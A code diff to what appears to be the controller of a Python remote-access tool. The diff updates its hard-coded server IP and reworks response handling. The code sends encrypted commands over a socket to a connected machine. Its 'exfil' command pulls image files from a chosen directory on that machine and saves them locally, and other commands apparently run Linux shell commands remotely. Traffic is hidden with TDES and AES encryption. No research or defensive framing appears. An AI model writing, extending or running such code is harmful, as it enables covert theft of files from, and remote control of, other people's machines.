@@ -5,7 +5,7 @@ from cryptography.hazmat.primitives import padding
 import os
 import json
 
-SERVER_IP = '172.31.4.131'
+SERVER_IP = '172.31.151.50'
 SERVER_PORT = 8080
 
 def encrypt_tdes(key, data):
@@ -91,6 +91,8 @@ while True:
             server_socket.close()
             exit(0)
 
+        response = []
+
         if message.split(' ')[0] == "exfil":
             if len(message.split(' ')) > 1:
                 path = message.split(' ')[1]
@@ -99,24 +101,21 @@ while True:
                 for i in images:
                     conn.sendall(encrypt_tdes(key, f"exfil {path}/{i}".encode()))
 
-                    response = []
-
                     img_size = decrypt_aes(key, conn.recv(1024)).decode()
                     rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
 
                     response = decrypt_aes(key, rec_msg)
                     # print("Image data received successfully!")
 
-                    f = open(f"images/{i}.jpg", "x+")
+                    f = open(f"images/{i}", "x+")
                     f.close()
-                    with open(f"images/{i}.jpg", "wb") as f:
+                    with open(f"images/{i}", "wb") as f:
                         f.write(response)
 
                 print("Image files written successfully!")
             else:
                 conn.sendall(encrypt_tdes(key, message.encode()))
 
-                response = []
                 while True:
                     r = decrypt_aes(key, conn.recv(4096)).decode()
 
@@ -127,10 +126,11 @@ while True:
                         response = json.loads(r)
                     else:
                         response += json.loads(r)
+                
+                print(response)
         else:  
             response = send_linux_command(message.encode())
-
-        print(response)
+            print(response)
 
         if len(response) == 0:
             print("Connection to {} closed".format(addr[0]))
